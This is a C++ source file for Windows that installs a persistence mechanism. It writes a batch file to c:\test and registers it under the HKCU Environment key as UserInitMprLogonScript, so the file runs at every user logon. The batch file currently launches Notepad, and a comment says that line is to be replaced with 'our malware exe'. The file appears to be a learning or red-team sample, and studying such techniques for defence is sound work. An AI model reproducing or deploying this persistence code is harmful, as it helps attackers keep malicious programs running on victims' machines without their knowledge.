#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <iostream>
#include <fstream>
#include <direct.h>



int main(int argc, char* argv[]){

    /* 
    The bat file is in the same directory for reference.
    Create the bat file first - and then this following code will create the registry that will
    start the bat file on startup.
    */
   mkdir("c:\\test");
   std::ofstream batfile;
   batfile.open("c:\\test\\UserInitMprLogonScript.bat");
   batfile << "@echo off\n";
   //Test purposes
   //batfile << "@echo # 'UserInitMprLogonScript'\n";
   //batfile << "@if exist c:\\test\\UserInitMprLogonScript.log @del c:\\test\\UserInitMprLogonScript.log\n";
   //batfile << "@echo UserInitMprLogonScript executed !> c:\\test\\UserInitMprLogonScript.log\n";
   //change this line with our malware exe
   batfile << "@start \"c:\\Windows\\System32\\notepad.exe\\\"\n";
   batfile << "@pause\n";
   batfile.close();



    HKEY hKey;
    LPCTSTR environment = TEXT("Environment");

    LONG test = RegCreateKeyEx(HKEY_CURRENT_USER, environment, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);

    // if(test==ERROR_SUCCESS){
    //     printf("success");
    // }else{
    //     printf("failed");
    // }

    LPCTSTR name = TEXT("UserInitMprLogonScript");
    LPCTSTR data = TEXT("c:\\test\\UserInitMprLogonScript.bat");

    LONG test2 = RegSetValueEx(hKey, name, 0, REG_SZ, (LPBYTE) data, (_tcslen(data)+1)*sizeof(TCHAR));

    // if(test2==ERROR_SUCCESS){
    //     printf("success2");
    // }else{
    //     printf("failed2");
    // }
    RegCloseKey(hKey);

}